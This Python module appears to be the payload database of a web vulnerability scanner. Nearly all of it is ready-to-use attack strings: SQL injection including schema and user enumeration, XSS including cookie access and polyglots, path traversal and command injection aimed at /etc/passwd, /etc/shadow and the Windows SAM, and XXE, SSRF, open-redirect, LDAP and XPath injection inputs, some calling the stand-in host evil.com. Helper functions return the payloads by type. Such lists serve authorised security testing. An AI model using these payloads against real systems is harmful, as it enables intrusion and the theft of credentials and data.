"""
SQL Injection and XSS Payloads Database
"""

# SQL Injection Payloads
SQLI_PAYLOADS = {
    'error_based': [
        "'",
        '"',
        "')",
        '")',
        "'))",
        '"))',
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        '" OR "1"="1',
        '" OR 1=1--',
        "' OR 'a'='a",
        "') OR ('1'='1",
        "')) OR (('1'='1",
        "' AND 1=1--",
        "' AND 1=2--",
        "' OR 'x'='x",
        "' AND 1=1",
        "' AND 1=2",
    ],
    'union_based': [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT 1,2,3,4--",
        "' UNION SELECT 1,2,3,4,5--",
        "' UNION SELECT @@version--",
        "' UNION SELECT database(),user()--",
        "' UNION SELECT table_name FROM information_schema.tables--",
    ],
    'time_based': [
        "' AND SLEEP(5)--",
        "' AND SLEEP(10)--",
        "' AND pg_sleep(5)--",
        "' AND pg_sleep(10)--",
        "'; WAITFOR DELAY '0:0:5'--",
        "'; WAITFOR DELAY '0:0:10'--",
        "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(CHR(99)||CHR(99)||CHR(99),5)--",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    ],
    'boolean_based': [
        "' AND 1=1--",
        "' AND 1=2--",
        "' AND 'a'='a",
        "' AND 'a'='b",
        "' AND LENGTH(database())>0--",
        "' AND ASCII(SUBSTRING(database(),1,1))>64--",
    ],
}

# XSS Payloads
XSS_PAYLOADS = {
    'basic': [
        "<script>alert('XSS')</script>",
        "<script>alert(\"XSS\")</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.cookie)</script>",
        "<script>confirm('XSS')</script>",
        "<script>prompt('XSS')</script>",
    ],
    'img_tag': [
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=confirm('XSS')>",
        "<img src=\"javascript:alert('XSS')\">",
        "<img src=javascript:alert('XSS')>",
    ],
    'svg_tag': [
        "<svg onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<svg/onload=alert('XSS')>",
        "<svg onload=confirm('XSS')>",
    ],
    'iframe_tag': [
        "<iframe src=\"javascript:alert('XSS')\">",
        "<iframe onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
    ],
    'body_tag': [
        "<body onload=alert('XSS')>",
        "<body onpageshow=alert('XSS')>",
        "<body onfocus=alert('XSS') autofocus>",
    ],
    'input_tag': [
        "<input onfocus=alert('XSS') autofocus>",
        "<input onmouseover=alert('XSS')>",
        "<input type=\"text\" onfocus=\"alert('XSS')\" autofocus>",
    ],
    'link_tag': [
        "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">",
        "<a href=\"javascript:alert('XSS')\">Click</a>",
        "<a href=\"javascript:alert(1)\">Click</a>",
    ],
    'encoded': [
        "&lt;script&gt;alert('XSS')&lt;/script&gt;",
        "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
        "<scr<script>ipt>alert('XSS')</scr</script>ipt>",
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
    ],
    'event_handlers': [
        "\" onfocus=\"alert('XSS')\" autofocus=\"",
        "\" onmouseover=\"alert('XSS')\"",
        "\" onclick=\"alert('XSS')\"",
        "' onfocus='alert("XSS")' autofocus='",
        "' onmouseover='alert(1)'",
    ],
    'polyglots': [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\">><marquee><img src=x onerror=alert(1)></marquee>",
        "\"><script>alert(String.fromCharCode(88,83,83))</script>",
    ],
}

# Directory Traversal Payloads
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../windows/system32/config/sam",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "....\\\\....\\\\....\\\\etc/passwd",
    "..%2f..%2f..%2fetc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
    "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "/etc/passwd",
    "/etc/shadow",
    "C:/windows/win.ini",
    "C:\\windows\\win.ini",
    "file:///etc/passwd",
    "file:///C:/windows/win.ini",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain,<?php phpinfo(); ?>",
]

# Open Redirect Payloads
OPEN_REDIRECT_PAYLOADS = [
    "//evil.com",
    "https://evil.com",
    "http://evil.com",
    "/\\evil.com",
    "///evil.com",
    "https:evil.com",
    "//evil.com/",
    "/.evil.com",
    "https://evil.com/",
    "http://evil.com/",
    " //evil.com",
    "https://evil.com/%2f..",
    "https://evil.com%2f%2e%2e",
    "//evil.com@google.com",
    "https://google.com.evil.com",
    "https://evil.com?google.com",
    "/%09/evil.com",
    "/%00/evil.com",
    "https://evil.com/google.com",
    "https://google.com/../evil.com",
]

# Command Injection Payloads
CMDI_PAYLOADS = [
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "` cat /etc/passwd`",
    "$(cat /etc/passwd)",
    "; whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "; dir",
    "| dir",
    "& ping -c 4 127.0.0.1",
    "| ping -n 4 127.0.0.1",
    "; sleep 5",
    "| sleep 5",
    "`sleep 5`",
]

# XXE Payloads
XXE_PAYLOADS = [
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>""",
    
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///C:/windows/win.ini" >]>
    <foo>&xxe;</foo>""",
    
    """<?xml version="1.0"?>
    <!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://evil.com/xxe">]>
    <foo>&xxe;</foo>""",
]

# SSRF Payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://[::]",
    "http://0177.0.0.1",
    "http://0177.1",
    "http://2130706433",
    "http://3232235521",
    "file:///etc/passwd",
    "dict://localhost:11211/",
    "gopher://localhost:9000/",
    "ftp://localhost",
]

# LDAP Injection Payloads
LDAP_PAYLOADS = [
    "*",
    "*)(&*",
    "*))%00",
    "*)((objectClass=*",
    "*))(&(objectClass=*",
    "*)((objectClass=*)",
    "*))(&(objectClass=*)",
    "*)(uid=*))(&(uid=*",
]

# XPath Injection Payloads
XPATH_PAYLOADS = [
    "' or '1'='1",
    "' or ''='",
    "x' or 1=1 or 'x'='y",
    "' or 'x'='x",
    "' and 'x'='y",
    "' or 1=1--",
    "' or 1=1#",
    "' or 1=1/*",
]

def get_payloads(vuln_type: str, category: str = None) -> list:
    """
    Get payloads for specific vulnerability type
    
    Args:
        vuln_type: Type of vulnerability (sqli, xss, etc.)
        category: Specific category of payloads
    
    Returns:
        List of payloads
    """
    payload_map = {
        'sqli': SQLI_PAYLOADS,
        'xss': XSS_PAYLOADS,
        'traversal': TRAVERSAL_PAYLOADS,
        'redirect': OPEN_REDIRECT_PAYLOADS,
        'cmdi': CMDI_PAYLOADS,
        'xxe': XXE_PAYLOADS,
        'ssrf': SSRF_PAYLOADS,
        'ldap': LDAP_PAYLOADS,
        'xpath': XPATH_PAYLOADS,
    }
    
    payloads = payload_map.get(vuln_type.lower(), [])
    
    if isinstance(payloads, dict):
        if category:
            return payloads.get(category, [])
        # Return all payloads if no category specified
        result = []
        for cat in payloads.values():
            result.extend(cat)
        return result
    
    return payloads


def add_custom_payload(vuln_type: str, payload: str, category: str = None):
    """
    Add custom payload to the database
    
    Args:
        vuln_type: Type of vulnerability
        payload: Payload string
        category: Category for grouped payloads
    """
    payload_map = {
        'sqli': SQLI_PAYLOADS,
        'xss': XSS_PAYLOADS,
    }
    
    payloads = payload_map.get(vuln_type.lower())
    if payloads is None:
        return False
    
    if isinstance(payloads, dict):
        if category:
            if category not in payloads:
                payloads[category] = []
            if payload not in payloads[category]:
                payloads[category].append(payload)
        else:
            # Add to 'custom' category
            if 'custom' not in payloads:
                payloads['custom'] = []
            if payload not in payloads['custom']:
                payloads['custom'].append(payload)
    else:
        if payload not in payloads:
            payloads.append(payload)
    
    return True
